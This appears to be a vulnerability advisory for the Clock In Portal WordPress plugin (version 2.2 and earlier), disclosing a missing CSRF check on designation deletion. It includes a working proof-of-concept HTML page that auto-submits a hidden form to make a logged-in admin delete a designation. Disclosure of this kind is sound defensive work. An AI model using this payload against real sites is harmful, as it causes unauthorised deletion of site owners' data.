## WordPress Plugin Vulnerabilities

# Clock In Portal <= 2.2 - Designation Deletion via CSRF

### Description

The plugin does not have CSRF check when deleting designations, which could allow attackers to make logged in admins delete arbitrary designations via a CSRF attack

### Proof of Concept

Make a logged in admin open a page with the code below, this will make them delete the Designation with ID 2
<html>
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/admin.php?page=cip-designations" method="POST">
<input type="hidden" name="action" value="delete" />
<input type="hidden" name="id" value="2" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
